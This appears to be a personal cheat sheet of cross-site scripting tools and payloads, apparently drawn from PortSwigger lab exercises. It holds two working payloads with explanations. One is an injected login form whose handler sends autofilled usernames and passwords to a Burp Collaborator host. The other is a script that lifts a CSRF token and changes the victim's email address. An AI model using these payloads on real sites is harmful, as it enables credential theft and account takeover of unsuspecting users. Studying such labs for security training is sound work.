### Tools:

# XSStrike
link:https://github.com/s0md3v/XSStrike
# dalfox
link:https://github.com/hahwul/dalfox
# ezXSS
link:https://github.com/ssl/ezXSS

### Payloads:

https://github.com/Proviesec/xss-payload-list
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### Portswigger payloads
*******<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">*****

The above payloads is used to steal victim username and password using burp collaborator.When the request is send and victim visits the vulnerable functionality
the it will autofill the username and password.It fetch the request when length is true which means password field is filled that's why length will be true and
request is triggered..Mode no-cors mean if the domain is changed (burb collaborator) still it didn't block the request. As a response it give username and 
password separeted by colon.


****<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>*****
The above script will be used to change the email address of victim.The script first send a request and wait for the response,from the response it will take the 
csrf token,use it send request to change the email address with test@test.com.
